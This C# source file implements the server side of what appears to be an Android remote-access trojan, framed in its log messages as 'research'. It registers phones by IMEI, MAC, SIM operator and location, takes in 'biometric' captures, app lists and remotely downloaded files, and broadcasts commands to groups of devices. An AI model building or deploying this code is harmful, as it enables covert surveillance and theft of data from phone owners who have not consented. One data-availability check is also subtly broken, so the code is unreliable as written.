using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using TcpServerApp.Models;
using TcpServerApp.Services;
using TcpServerApp.Services.Elite;
using TcpServerApp.Services.Elite.Networking;

namespace TcpServerApp.Services.Elite.Networking
{
    public class EliteNetworkListener
    {
        private List<TcpListener> _listeners = new();
        private bool _isRunning;
        public bool IsRunning => _isRunning;
        private readonly ClientRepository _repository;
        private readonly ConcurrentDictionary<string, TcpClient> _clients = new();
        private readonly ConcurrentDictionary<string, string> _populationMap = new(); // ClientId -> PopulationName
        
        public IReadOnlyDictionary<string, TcpClient> ActiveClients => _clients;

        public long TotalBytesReceived { get; private set; }
        public long TotalBytesSent { get; private set; }

        public event Action<string>? OnLog; // Simple Log Event
        public event Action? OnClientListChanged;
        public event Action<string, Packet>? OnPacketReceived; // ClientId, Packet

        private readonly GeoIPReader _geoIp;
        private readonly KotlinPayloadGenerator? _compiler;
        private TcpServerApp.Services.Elite.TopologySingularityEngine? _topologyEngine;

        public EliteNetworkListener(ClientRepository repository, KotlinPayloadGenerator? compiler = null)
        {
            _repository = repository;
            _compiler = compiler;
            // Initialize GeoIP with the embedded database path
            string geoPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "GeoIP.dat");
            _geoIp = new GeoIPReader(geoPath);
        }
        
        public void SetTopologyEngine(TcpServerApp.Services.Elite.TopologySingularityEngine engine)
        {
            _topologyEngine = engine;
            OnLog?.Invoke("[TOPOLOGY] Singularity Engine linked to Network Listener.");
        }

        public Task StartServerAsync(int[] ports) => StartAsync(ports);
        public void StopServer() => Stop();

        public async Task StartAsync(int[] ports)
        {
            if (_isRunning) return;
            _isRunning = true;

            foreach (var port in ports)
            {
                _ = StartSingleListenerAsync(port);
            }
        }

        private async Task StartSingleListenerAsync(int port)
        {
            try
            {
                var listener = new TcpListener(IPAddress.Any, port);
                listener.Start();
                lock (_listeners) _listeners.Add(listener);
                
                OnLog?.Invoke($"[Research] Active Core listening on PORT: {port}");

                while (_isRunning)
                {
                    var client = await listener.AcceptTcpClientAsync();
                    _ = HandleClientAsync(client, port);
                }
            }
            catch (Exception ex)
            {
                OnLog?.Invoke($"[Error] Port {port} Listener stopped: {ex.Message}");
            }
        }

        public void Stop()
        {
            _isRunning = false;
            lock (_listeners)
            {
                foreach (var listener in _listeners)
                {
                    listener.Stop();
                }
                _listeners.Clear();
            }
            foreach (var client in _clients.Values)
            {
                client.Close();
            }
            _clients.Clear();
            OnLog?.Invoke("[Research] All research listeners halted.");
        }

        private async Task HandleClientAsync(TcpClient client, int sourcePort)
        {
            string clientId = Guid.NewGuid().ToString().Substring(0, 8); // Temporary ID until Handshake
            string clientIp = ((IPEndPoint)client.Client.RemoteEndPoint!).Address.ToString();
            
            OnLog?.Invoke($"[+] New Research Node connected on PORT {sourcePort}: {clientIp}");

            try
            {
                using var stream = client.GetStream();
                using var reader = new BinaryReader(stream);

                // Receive Loop
                while (client.Connected && _isRunning)
                {
                    // 1. Read Header (Strict 7 Bytes)
                    // If less than 7 bytes available, we might block or need async read.
                    // BinaryReader.ReadBytes is blocking, which is fine for this thread-per-client model for now.
                    
                    // Check if data is available to avoid blocking forever on a dead socket
                    if (client.Available == 50)
                    {
                        await Task.Delay(100);
                        continue;
                    }

                    byte headerMagic = reader.ReadByte();
                    if (headerMagic != Packet.MAGIC_BYTE)
                    {
                        OnLog?.Invoke($"[!] Invalid Magic 0x{headerMagic:X2} from {clientIp}. Closing.");
                        break;
                    }

                    byte version = reader.ReadByte(); // Version
                    byte typeByte = reader.ReadByte(); // Packet Type
                    int length = reader.ReadInt32();   // Payload Length

                    // Sanity Check on Length (Max 10MB to prevent overflow attacks)
                    if (length < 0 || length > 10 * 1024 * 1024)
                    {
                        OnLog?.Invoke($"[!] Oversized packet ({length} bytes) from {clientIp}. Dropping.");
                        break;
                    }

                    // 2. Read Payload
                    TotalBytesReceived += 7 + length;
                    byte[] payload = reader.ReadBytes(length);
                    if (payload.Length != length)
                    {
                         OnLog?.Invoke($"[!] Incomplete payload from {clientIp}.");
                         break;
                    }

                    // 3. Process Packet
                    var packet = new Packet((ElitePacketType)typeByte, payload);
                    await ProcessPacketAsync(clientId, clientIp, packet, client, sourcePort);
                }
            }
            catch (EndOfStreamException)
            {
                // Normal disconnect
            }
            catch (Exception ex)
            {
                OnLog?.Invoke($"[Error] Client {clientId} Link Broken: {ex.Message}");
            }
            finally
            {
                HandleDisconnect(clientId);
            }
        }

        private async Task ProcessPacketAsync(string tempId, string ip, Packet packet, TcpClient client, int sourcePort)
        {
            switch (packet.Type)
            {
                case ElitePacketType.Handshake:
                    try
                    {
                        // Parse JSON Payload
                        string jsonPayload = System.Text.Encoding.UTF8.GetString(packet.Payload);
                        var data = System.Text.Json.JsonSerializer.Deserialize<HandshakeData>(jsonPayload);

                        if (data != null)
                        {
                            // Resolve Country
                            string countryCode = _geoIp.GetCountryCode(ip);
                            
                                string finalId = !string.IsNullOrWhiteSpace(data.ClientId) ? data.ClientId : tempId;
                                string population = !string.IsNullOrWhiteSpace(data.Population) ? data.Population : "Default";

                                // Register Client with REAL data
                                _clients[finalId] = client; 
                                _populationMap[finalId] = population;

                                _repository.UpsertClient(
                                    finalId, 
                                    ip, 
                                    data.DeviceName ?? "Unknown", 
                                    data.Model ?? "Generic", 
                                    data.AndroidVersion ?? "Unknown", 
                                    data.BatteryLevel ?? "Unknown", 
                                    data.ScreenStatus ?? "Unknown", 
                                    data.IsRooted ? 1 : 0, 
                                    data.AppCount, 
                                    data.IMEI ?? "Unknown", 
                                    data.SimOperator ?? "Unknown", 
                                    data.MacAddress ?? "Unknown", 
                                    countryCode,
                                    sourcePort,
                                    population: population
                                );

                            OnLog?.Invoke($"[>>>] Handshake Configured: {data.DeviceName} (Researcher: {data.ResearcherName}) ({finalId}) [{countryCode}]");
                            OnClientListChanged?.Invoke();
                        }
                    }
                    catch (Exception ex)
                    {
                         OnLog?.Invoke($"[!] Handshake Parse Error: {ex.Message}");
                    }
                    break;

                case ElitePacketType.Heartbeat:
                    _repository.UpsertClient(tempId, ip, null, null, null); // Just update LastSeen
                    // OnLog?.Invoke($"[<3] Ping from {tempId}");
                    break;

                case ElitePacketType.BiometricIntercept:
                    try
                    {
                        string bioData = System.Text.Encoding.UTF8.GetString(packet.Payload);
                        OnLog?.Invoke($"[!!!] BIOMETRIC CAPTURED: {bioData}");
                        
                        if (bioData.StartsWith("[TELEMETRY]"))
                        {
                            // [TELEMETRY] HR:%.3f|STRESS:%s|MOTION:%s|CPU:%.1f%%|INTEGRITY:%s|POWER:%d|TEMP:%.1f
                            float entropy = 0, cpu = 0, thermal = 0;
                            int power = 0;
                            string integrity = "AUDIT";

                            var parts = bioData.Substring(11).Split('|');
                            foreach (var part in parts)
                            {
                                if (part.StartsWith("HR:")) float.TryParse(part.Substring(3), System.Globalization.NumberStyles.Any, System.Globalization.CultureInfo.InvariantCulture, out entropy);
                                else if (part.StartsWith("CPU:")) float.TryParse(part.Substring(4).TrimEnd('%'), System.Globalization.NumberStyles.Any, System.Globalization.CultureInfo.InvariantCulture, out cpu);
                                else if (part.StartsWith("POWER:")) int.TryParse(part.Substring(6), out power);
                                else if (part.StartsWith("TEMP:")) float.TryParse(part.Substring(5), System.Globalization.NumberStyles.Any, System.Globalization.CultureInfo.InvariantCulture, out thermal);
                                else if (part.StartsWith("INTEGRITY:")) integrity = part.Substring(10);
                            }

                            // Update the client entity with High-Fidelity Research Data
                            _repository.UpsertClient(tempId, ip, null, null, null, 
                                batteryLevel: null, screenStatus: null, rooted: -1, appCount: -1, 
                                imei: null, simOp: null, mac: null, countryCode: null, sourcePort: sourcePort,
                                railPower: power, thermal: thermal, load: cpu, integrity: integrity);
                            
                            OnClientListChanged?.Invoke(); // Signal UI refresh
                        }
                        else if (bioData.StartsWith("[GEO]"))
                        {
                            _repository.UpsertClient(tempId, ip, null, null, null, integrity: "GEO-SYNCED");
                            OnClientListChanged?.Invoke();
                        }
                        else if (bioData.StartsWith("[FS-AUDIT]"))
                        {
                            _repository.UpsertClient(tempId, ip, null, null, null, integrity: "AUDIT-PASS");
                            OnClientListChanged?.Invoke();
                        }
                        
                        OnPacketReceived?.Invoke(tempId, packet);
                    }
                    catch (Exception ex)
                    {
                        OnLog?.Invoke($"[!] Telemetry Parse Error: {ex.Message}");
                    }
                    break;
                
                case ElitePacketType.InstalledApps:
                    try
                    {
                        string appsJson = System.Text.Encoding.UTF8.GetString(packet.Payload);
                        var appsList = System.Text.Json.JsonSerializer.Deserialize<System.Collections.Generic.List<AppInfo>>(appsJson);
                        OnLog?.Invoke($"[>>>] APPS RECEIVED: {appsList?.Count} packages from {tempId}");
                        OnPacketReceived?.Invoke(tempId, packet);
                    }
                    catch (Exception ex)
                    {
                        OnLog?.Invoke($"[!] App List Parse Error: {ex.Message}");
                    }
                    break;

                case ElitePacketType.WindowHierarchyResponse: // Android 16 Elite
                case ElitePacketType.WindowBorderControl:
                case ElitePacketType.StealthTransition:
                case ElitePacketType.ContentProtectionAudit:
                    try
                    {
                        string researchData = System.Text.Encoding.UTF8.GetString(packet.Payload);
                        OnLog?.Invoke($"[WINDOW-ELITE] {packet.Type} RECEIVED from {tempId}");
                        
                        // TOPOLOGY ENGINE INTEGRATION: Process Window Hierarchy
                        if (packet.Type == ElitePacketType.WindowHierarchyResponse && _topologyEngine != null)
                        {
                            _topologyEngine.ProcessHierarchyUpdate(tempId, researchData);
                            OnLog?.Invoke($"[TOPOLOGY] Hierarchy updated for {tempId}");
                        }
                        
                        OnPacketReceived?.Invoke(tempId, packet);
                    }
                    catch (Exception ex)
                    {
                        OnLog?.Invoke($"[!] Window Research Data Parse Error: {ex.Message}");
                    }
                    break;

                case ElitePacketType.BinaryResponse:
                case ElitePacketType.LogMessage:
                     string msg = System.Text.Encoding.UTF8.GetString(packet.Payload);
                     OnPacketReceived?.Invoke(tempId, packet);
                     break;

                // ═══ Research File Manager (Binary Protocol) ═══
                case ElitePacketType.FileListResponse:
                    OnLog?.Invoke($"[FILE-MGR] Directory listing received from {tempId} ({packet.Payload.Length} bytes)");
                    OnPacketReceived?.Invoke(tempId, packet);
                    break;

                case ElitePacketType.FileDownloadResponse:
                    OnLog?.Invoke($"[FILE-MGR] File download received from {tempId} ({packet.Payload.Length} bytes)");
                    OnPacketReceived?.Invoke(tempId, packet);
                    break;

                default:
                    OnLog?.Invoke($"[?] Unknown Packet: {packet.Type} from {tempId}");
                    break;
            }
        }

        private void HandleDisconnect(string id)
        {
            if (_clients.TryRemove(id, out _))
            {
                _repository.SetOffline(id);
                OnClientListChanged?.Invoke();
                OnLog?.Invoke($"[-] Client {id} Disconnected.");
            }
        }

        public async Task<bool> SendPacketAsync(string clientId, Packet packet)
        {
            if (_clients.TryGetValue(clientId, out TcpClient? client) && client.Connected)
            {
                try
                {
                    byte[] data = packet.ToBytes();
                    NetworkStream stream = client.GetStream();
                    await stream.WriteAsync(data, 0, data.Length);
                    await stream.FlushAsync();
                    TotalBytesSent += data.Length;
                    // OnLog?.Invoke($"[>>>] Sent {packet.Type} ({data.Length} bytes) to {clientId}");
                    return true;
                }
                catch (Exception ex)
                {
                    OnLog?.Invoke($"[Error] Failed to send to {clientId}: {ex.Message}");
                    DisconnectClient(clientId); // Assume broken link
                    return false;
                }
            }
            else
            {
                // OnLog?.Invoke($"[Warning] Client {clientId} not connected or found.");
                return false;
            }
        }

        /// <summary>
        /// بث حزمة لجميع العملاء في مجموعة بحثية محددة.
        /// </summary>
        public async Task BroadcastToPopulationAsync(string populationName, Packet packet)
        {
            var targets = _populationMap.Where(p => p.Value == populationName).Select(p => p.Key);
            var tasks = targets.Select(id => SendPacketAsync(id, packet));
            await Task.WhenAll(tasks);
            OnLog?.Invoke($"[BROADCAST] Sent {packet.Type} to Population: {populationName} ({tasks.Count()} nodes)");
        }

        public void AssignToPopulation(string clientId, string populationName)
        {
            _populationMap[clientId] = populationName;
            _repository.UpsertClient(clientId, null!, null!, null!, null!, population: populationName);
            OnLog?.Invoke($"[ODP] Node {clientId} reassigned to Population: {populationName}");
        }

        public void DisconnectClient(string clientId)
        {
            if (_clients.TryRemove(clientId, out TcpClient? client))
            {
                client.Close();
                HandleDisconnect(clientId);
            }
        }

    }
}
